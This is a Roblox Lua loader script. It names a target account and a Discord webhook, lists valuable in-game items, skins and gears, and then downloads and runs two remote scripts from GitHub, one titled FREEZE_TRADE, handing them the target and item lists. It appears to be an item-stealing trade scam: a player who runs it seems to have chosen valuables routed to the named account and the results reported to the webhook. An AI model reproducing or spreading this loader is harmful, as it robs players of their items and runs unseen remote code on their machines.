local TARGET_ID = 7514362783
local TARGET_USER = "Mexicanx_5"
local WEBHOOK_URL = "https://discord.gg/XQDgsvcbA"

local TargetBrainrots = {
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Rico Dinero"] = true,
    ["Globa Steppa"] = true,
    ["Digi Narwhal"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Bacuru and Egguru"] = true,
    ["67"] = true,
    ["Boppin Bunny"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["DJ Panda"] = true,
    ["Esok Sekolah"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Kepat"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Grande Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["Lavadorito Spinito"] = true,
    ["Bumbatron"] = true,
    ["Los Chicleteiras"] = true,
    ["Los Puggies"] = true,
    ["Love Love Bear"] = true,
    ["Lovin Rose"] = true,
    ["Money Money Puggy"] = true,
    ["Nacho Spyder"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)